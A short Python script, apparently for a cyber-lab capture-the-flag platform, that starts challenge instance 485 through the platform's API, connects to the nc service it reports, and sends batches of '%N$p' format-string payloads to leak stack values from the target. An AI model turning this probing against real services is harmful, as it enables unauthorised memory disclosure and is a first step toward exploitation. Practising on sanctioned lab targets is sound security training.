import sys, socket, time, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import json
sys.path.insert(0, r".")
from cylab2 import CyLab
from cylab2 import CyLab as C

cy = C(delay=1.2)
cy.login()
cy.req("PUT", "/api/challenges/485/instance/?source=library")
port = None
for _ in range(15):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/485/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"nc\s+([A-Za-z0-9.\-]+)\s+(\d+)", d.get("description") or "")
        if m:
            port = int(m.group(2))
            print("nc:", m.group(0))
        break
if not port:
    sys.exit(1)

s = socket.create_connection(("chatelaine.cylabacademy.net", port), timeout=12)
s.settimeout(6)
time.sleep(0.6)
try:
    s.recv(4096)
except Exception:
    pass


def ask(payload):
    s.sendall(payload + b"\n")
    time.sleep(0.5)
    out = b""
    try:
        out = s.recv(65536)
    except Exception:
        pass
    return out.decode("utf-8", "replace")


for start in range(1, 41, 8):
    spec = ".".join(f"%{i}$p" for i in range(start, start + 8))
    txt = ask(spec.encode())
    print(f"[{start}-{start+7}]", re.sub(r"\s+", " ", txt)[:400])
s.close()
